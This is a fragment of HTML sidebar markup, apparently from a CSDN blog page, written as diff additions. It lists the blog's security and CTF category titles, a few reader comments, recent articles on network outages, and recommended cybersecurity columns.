+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_12601202.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_12601202.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> 数据网 </span> </a> <span class="special-column-num">1篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11321741.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11321741.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756754.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> 渗透测试 </span> </a> <span class="special-column-num">22篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11860031.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11860031.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756724.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> 沙盒逃逸 </span> </a> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11333676.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11333676.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756757.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> CTF_代码审计 </span> </a> <span class="special-column-num">6篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11413976.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11413976.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756919.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> CTF_流量日志分析 </span> </a> <span class="special-column-num">4篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11787938.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11787938.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> CTF_秘钥问题 </span> </a> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11349192.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11349192.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756919.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> 环境问题处理 </span> </a> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11668478.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11668478.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756738.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> python爬虫 </span> </a> <span class="special-column-num">2篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11345954.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11345954.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> 逆向工程 </span> </a> <span class="special-column-num">2篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11624235.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11624235.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756780.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> RPA学习 </span> </a> <span class="special-column-num">1篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11604416.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11604416.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> 交换机配置 </span> </a> <span class="special-column-num">1篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11319890.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11319890.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> 反序列化 </span> </a> <span class="special-column-num">4篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11414089.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11414089.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756916.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> CTF_现代密码学 </span> </a> <span class="special-column-num">1篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11407652.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11407652.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756923.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> CTF_COOKIE注入 </span> </a> <span class="special-column-num">1篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11349237.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11349237.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> CTF_XXE漏洞 </span> </a> <span class="special-column-num">2篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11337524.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11337524.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756923.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> rsa </span> </a> <span class="special-column-num">10篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11323613.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11323613.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756754.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> DC系列靶场 </span> </a> <span class="special-column-num">8篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11319903.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11319903.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756724.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> 漏洞复现 </span> </a> <span class="special-column-num">11篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11319638.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11319638.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756926.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> CTF_文件上传 </span> </a> <span class="special-column-num">11篇</span> </li> 
+        <li> <a class="clearfix special-column-name" href="https://blog.csdn.net/serendipity1130/category_11319906.html" data-report-click="{&quot;mod&quot;:&quot;popu_537&quot;,&quot;spm&quot;:&quot;3001.4137&quot;,&quot;strategy&quot;:&quot;pc付费专栏左侧入口&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/category_11319906.html&quot;,&quot;ab&quot;:&quot;new&quot;}"> 
+          <div class="special-column-bar "></div> <img src="https://i-blog.csdnimg.cn/columns/default/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://i-blog.csdnimg.cn/columns/default/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'"> <span class="title oneline"> apache </span> </a> </li> 
+       </ul> 
+      </div> 
+      <p class="text-center"> <a class="flexible-btn" data-fbox="aside-archive"><img class="look-more" src="https://csdnimg.cn/release/blogv2/dist/pc/img/arrowDownWhite.png" alt=""></a> </p> 
+     </div> 
+     <div id="asideNewComments" class="aside-box"> 
+      <h3 class="aside-title">最新评论</h3> 
+      <div class="aside-content"> 
+       <ul class="newcomment-list"> 
+        <li> <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/serendipity1130/article/details/120150631#comments_34864108" data-report-click="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120150631#comments_34864108&quot;,&quot;ab&quot;:&quot;new&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120150631#comments_34864108&quot;,&quot;ab&quot;:&quot;new&quot;}">【密码学RSA】rsa_p高位泄露(2021四川省数字创新赛题)</a> <p class="comment ellipsis"> <a href="https://blog.csdn.net/2301_78952501" class="user-name" target="_blank">2301_78952501: </a> <span class="code-comments">这是因为应该是sagemath环境，只用python环境是无法运行的</span> </p> </li> 
+        <li> <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/serendipity1130/article/details/120009530#comments_32879716" data-report-click="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120009530#comments_32879716&quot;,&quot;ab&quot;:&quot;new&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120009530#comments_32879716&quot;,&quot;ab&quot;:&quot;new&quot;}">【靶机渗透】Escalate_Linux靶机渗透练习+12种提权方式</a> <p class="comment ellipsis"> <a href="https://blog.csdn.net/m0_62803454" class="user-name" target="_blank">m0_62803454: </a> <span class="code-comments">为什么第8步哪里shell之后就没有反应？</span> </p> </li> 
+        <li> <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/serendipity1130/article/details/120150631#comments_32304917" data-report-click="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120150631#comments_32304917&quot;,&quot;ab&quot;:&quot;new&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120150631#comments_32304917&quot;,&quot;ab&quot;:&quot;new&quot;}">【密码学RSA】rsa_p高位泄露(2021四川省数字创新赛题)</a> <p class="comment ellipsis"> <a href="https://blog.csdn.net/m0_73927559" class="user-name" target="_blank">m0_73927559: </a> <span class="code-comments">现在解决了吗，哥</span> </p> </li> 
+        <li> <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/serendipity1130/article/details/120003260#comments_31619966" data-report-click="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120003260#comments_31619966&quot;,&quot;ab&quot;:&quot;new&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120003260#comments_31619966&quot;,&quot;ab&quot;:&quot;new&quot;}">【靶机渗透】入门级Toppo靶机渗透练习</a> <p class="comment ellipsis"> <a href="https://blog.csdn.net/serendipity1130" class="user-name" target="_blank">malloc_冲！: </a> <span class="code-comments">谢谢提醒~</span> </p> </li> 
+        <li> <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/serendipity1130/article/details/120772990#comments_31443308" data-report-click="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120772990#comments_31443308&quot;,&quot;ab&quot;:&quot;new&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_542&quot;,&quot;spm&quot;:&quot;3001.4231&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120772990#comments_31443308&quot;,&quot;ab&quot;:&quot;new&quot;}">【CTF_流量日志分析】二分法盲注分析</a> <p class="comment ellipsis"> <a href="https://blog.csdn.net/qq_33295410" class="user-name" target="_blank">M1r4n: </a> <span class="code-comments">【CTF_流量日志分析】二分法盲注分析值得学习，非常受益，期待serendipity1130的下一篇文章</span> </p> </li> 
+       </ul> 
+      </div> 
+     </div> 
+     <div id="asideArchive" class="aside-box" style="display:block!important; width:300px;"> 
+      <h3 class="aside-title">最新文章</h3> 
+      <div class="aside-content"> 
+       <ul class="inf_list clearfix"> 
+        <li class="clearfix"> <a href="https://blog.csdn.net/serendipity1130/article/details/138582251" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_382&quot;,&quot;spm&quot;:&quot;3001.4136&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/138582251&quot;,&quot;ab&quot;:&quot;new&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_382&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/138582251&quot;,&quot;ab&quot;:&quot;new&quot;}">【局域网】VRRP双主导致业务中断原因分析</a> </li> 
+        <li class="clearfix"> <a href="https://blog.csdn.net/serendipity1130/article/details/136847112" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_382&quot;,&quot;spm&quot;:&quot;3001.4136&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/136847112&quot;,&quot;ab&quot;:&quot;new&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_382&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/136847112&quot;,&quot;ab&quot;:&quot;new&quot;}">【数据网故障分析】LDP与BGP中断情况分析</a> </li> 
+        <li class="clearfix"> <a href="https://blog.csdn.net/serendipity1130/article/details/136619726" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_382&quot;,&quot;spm&quot;:&quot;3001.4136&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/136619726&quot;,&quot;ab&quot;:&quot;new&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_382&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/136619726&quot;,&quot;ab&quot;:&quot;new&quot;}">【电网】VPN-TARGET配置错误导致业务中断的分析与跨域策略优化</a> </li> 
+       </ul> 
+       <div class="archive-bar"></div> 
+       <div class="archive-box"> 
+        <div class="archive-list-item">
+         <a href="https://blog.csdn.net/serendipity1130?type=blog&amp;year=2024&amp;month=05" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_538&quot;,&quot;spm&quot;:&quot;3001.4138&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130?type=blog&amp;year=2024&amp;month=05&quot;}"><span class="year">2024年</span><span class="num">3篇</span></a>
+        </div> 
+        <div class="archive-list-item">
+         <a href="https://blog.csdn.net/serendipity1130?type=blog&amp;year=2022&amp;month=06" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_538&quot;,&quot;spm&quot;:&quot;3001.4138&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130?type=blog&amp;year=2022&amp;month=06&quot;}"><span class="year">2022年</span><span class="num">6篇</span></a>
+        </div> 
+        <div class="archive-list-item">
+         <a href="https://blog.csdn.net/serendipity1130?type=blog&amp;year=2021&amp;month=11" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_538&quot;,&quot;spm&quot;:&quot;3001.4138&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130?type=blog&amp;year=2021&amp;month=11&quot;}"><span class="year">2021年</span><span class="num">71篇</span></a>
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+     <!-- 详情页显示目录 --> 
+     <!--文章目录--> 
+     <div id="asidedirectory" class="aside-box"> 
+      <div class="groupfile " id="directory"> 
+       <h3 class="aside-title">目录</h3> 
+       <div class="align-items-stretch group_item" id="align-items-stretch"> 
+        <div class="pos-box"> 
+         <div class="scroll-box"> 
+          <div class="toc-box"></div> 
+         </div> 
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+    </aside>    
+   </div> 
+   <div class="recommend-right align-items-stretch clearfix" id="rightAside" data-type="recommend"> 
+    <aside class="recommend-right_aside"> 
+     <div class="rightside-fixed-hide"> 
+      <div class="recommend-column-box aside-box"> 
+       <h3 class="aside-title">相关专栏 </h3> 
+       <div class="aside-content"> 
+        <div class="recommend-column-itembox exp1"> 
+         <a href="https://blog.csdn.net/eastmount/category_9183790.html" title="网络安全自学篇" target="_blank" data-report-view="{&quot;spm&quot;:&quot;3001.10573&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/eastmount/category_9183790.html&quot;,&quot;ab&quot;:&quot;exp1&quot;,&quot;extra&quot;:&quot;{\&quot;id\&quot;:\&quot;120009530\&quot;,\&quot;recommendCount\&quot;:\&quot;14\&quot;,\&quot;index\&quot;:\&quot;0\&quot;,\&quot;type\&quot;:\&quot;column\&quot;}&quot;}" data-report-click="{&quot;spm&quot;:&quot;3001.10573&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/eastmount/category_9183790.html&quot;,&quot;ab&quot;:&quot;exp1&quot;,&quot;extra&quot;:&quot;{\&quot;id\&quot;:\&quot;120009530\&quot;,\&quot;recommendCount\&quot;:\&quot;14\&quot;,\&quot;index\&quot;:\&quot;0\&quot;,\&quot;type\&quot;:\&quot;column\&quot;}&quot;}"> 
+          <div class="info-box"> 
+           <div class="img-box"> 
+            <div class="column-img" style="background-image: url(https://i-blog.csdnimg.cn/blog_column_migrate/e692813588b4403eba6b1b430ca159d2.jpeg?x-oss-process=image/resize,m_fixed,h_224,w_224)" alt="网络安全自学篇" srcset=""></div> 
+           </div> 
+           <div class="info"> 
+            <div class="title-box"> 
+             <p class="title">网络安全自学篇</p> 
+             <p class="tag">专栏</p> 
+            </div> 
+            <p class="learn">3424 人学习</p> 
+           </div> 
+          </div> <p class="desc" title="网络安全专栏共200篇文章，包括基础篇和提高篇。涵盖网络安全、Web渗透、安全论文、CTF、CVE、人工智能安全等。主要是作者从零学习安全和实践操作的在线笔记，希望对您有所帮助，共勉。订购私聊可加微信交流技术~">网络安全专栏共200篇文章，包括基础篇和提高篇。涵盖网络安全、Web渗透、安全论文、CTF、CVE、人工智能安全等。主要是作者从零学习安全和实践操作的在线笔记，希望对您有所帮助，共勉。订购私聊可加微信交流技术~</p> </a> 
+        </div> 
+        <div class="recommend-column-itembox exp1"> 
+         <a href="https://blog.csdn.net/k_love1219/category_9762590.html" title="网络安全" target="_blank" data-report-view="{&quot;spm&quot;:&quot;3001.10573&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/k_love1219/category_9762590.html&quot;,&quot;ab&quot;:&quot;exp1&quot;,&quot;extra&quot;:&quot;{\&quot;id\&quot;:\&quot;120009530\&quot;,\&quot;recommendCount\&quot;:\&quot;14\&quot;,\&quot;index\&quot;:\&quot;1\&quot;,\&quot;type\&quot;:\&quot;column\&quot;}&quot;}" data-report-click="{&quot;spm&quot;:&quot;3001.10573&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/k_love1219/category_9762590.html&quot;,&quot;ab&quot;:&quot;exp1&quot;,&quot;extra&quot;:&quot;{\&quot;id\&quot;:\&quot;120009530\&quot;,\&quot;recommendCount\&quot;:\&quot;14\&quot;,\&quot;index\&quot;:\&quot;1\&quot;,\&quot;type\&quot;:\&quot;column\&quot;}&quot;}"> 
+          <div class="info-box"> 
+           <div class="img-box"> 
+            <div class="column-img" style="background-image: url(https://i-blog.csdnimg.cn/blog_column_migrate/97cca99ea8753462741edfa8c05bcb61.png?x-oss-process=image/resize,m_fixed,h_224,w_224)" alt="网络安全" srcset=""></div> 
+           </div> 
+           <div class="info"> 
+            <div class="title-box"> 
+             <p class="title">网络安全</p> 
+             <p class="tag">专栏</p> 
+            </div> 
+            <p class="learn">6 人学习</p> 
+           </div> 
+          </div> <p class="desc" title="致力于网络安全">致力于网络安全</p> </a> 
+        </div> 
+        <div class="recommend-column-itembox exp1"> 
+         <a href="https://blog.csdn.net/franxx_02/category_12040946.html" title="中职网络安全" target="_blank" data-report-view="{&quot;spm&quot;:&quot;3001.10573&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/franxx_02/category_12040946.html&quot;,&quot;ab&quot;:&quot;exp1&quot;,&quot;extra&quot;:&quot;{\&quot;id\&quot;:\&quot;120009530\&quot;,\&quot;recommendCount\&quot;:\&quot;14\&quot;,\&quot;index\&quot;:\&quot;2\&quot;,\&quot;type\&quot;:\&quot;column\&quot;}&quot;}" data-report-click="{&quot;spm&quot;:&quot;3001.10573&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/franxx_02/category_12040946.html&quot;,&quot;ab&quot;:&quot;exp1&quot;,&quot;extra&quot;:&quot;{\&quot;id\&quot;:\&quot;120009530\&quot;,\&quot;recommendCount\&quot;:\&quot;14\&quot;,\&quot;index\&quot;:\&quot;2\&quot;,\&quot;type\&quot;:\&quot;column\&quot;}&quot;}"> 
+          <div class="info-box"> 
+           <div class="img-box"> 
+            <div class="column-img" style="background-image: url(https://i-blog.csdnimg.cn/blog_column_migrate/0b2c8c248e1b177bf5cf3a1fd190fc84.png?x-oss-process=image/resize,m_fixed,h_224,w_224)" alt="中职网络安全" srcset=""></div> 
+           </div> 
+           <div class="info"> 
+            <div class="title-box"> 
+             <p class="title">中职网络安全</p> 
+             <p class="tag">专栏</p> 
+            </div> 
+            <p class="learn">2 人学习</p> 
